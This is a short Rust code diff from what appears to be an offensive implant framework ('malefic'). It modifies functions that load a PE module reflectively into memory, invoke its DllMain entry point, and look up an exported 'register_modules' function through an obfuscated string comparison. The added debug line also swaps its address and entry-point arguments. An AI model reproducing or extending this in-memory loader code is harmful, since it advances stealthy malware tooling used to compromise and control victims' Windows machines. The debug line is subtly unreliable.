@@ -87,6 +87,7 @@ pub unsafe fn load_module(
     if dark_module.is_null() || (*dark_module).entry_point.is_null() {
         return Err(ArgsError("dark module load failed!".to_string()));
     }
+    debug!("[+] dark module loaded at {:x}, entry point: {:x}", (*dark_module).entry_point as usize, dark_module as usize);
     let _ = core::mem::transmute::<usize, DllMain>((*dark_module).entry_point as usize)(
         dark_module as _,
         1, // DLL_PROCESS_ATTACH
@@ -121,27 +122,25 @@ pub unsafe fn unload_pe(
 
 
 #[cfg(target_os = "windows")]
-#[cfg(feature = "prebuild")]
 pub unsafe fn call_fresh_modules(module: *const c_void) -> Option<*const c_void> {
-    use crate::win::kit::DarkModule;
-    let module: *const DarkModule = module as _;
+    #[cfg(feature = "prebuild")]
+    use crate::win::kit::MaleficModule;
+    #[cfg(feature = "source")]
+    use malefic_win_kit::pe::PELoader::MaleficModule;
+    let module: *const MaleficModule = module as _;
     if module.is_null() {
         return None;
     }
-
-    Some(get_function_address((*module).module_base, "register_modules"))
-}
-
-#[cfg(target_os = "windows")]
-#[cfg(feature = "source")]
-pub unsafe fn call_fresh_modules(
-    module: *const malefic_win_kit::pe::PELoader::MaleficModule,
-) -> Option<*const c_void> {
-    if module.is_null() {
+    if (*module).export_func.is_empty() {
         return None;
     }
+    for i in (*module).export_func.iter() {
+        if i.0 == obfstr!("register_modules") {
+            return Some(i.1 as *const c_void);
+        }
+    }
+    None
 
-    Some(get_function_address((*module).new_module, "register_modules"))
 }
 
 #[cfg(target_family = "unix")]
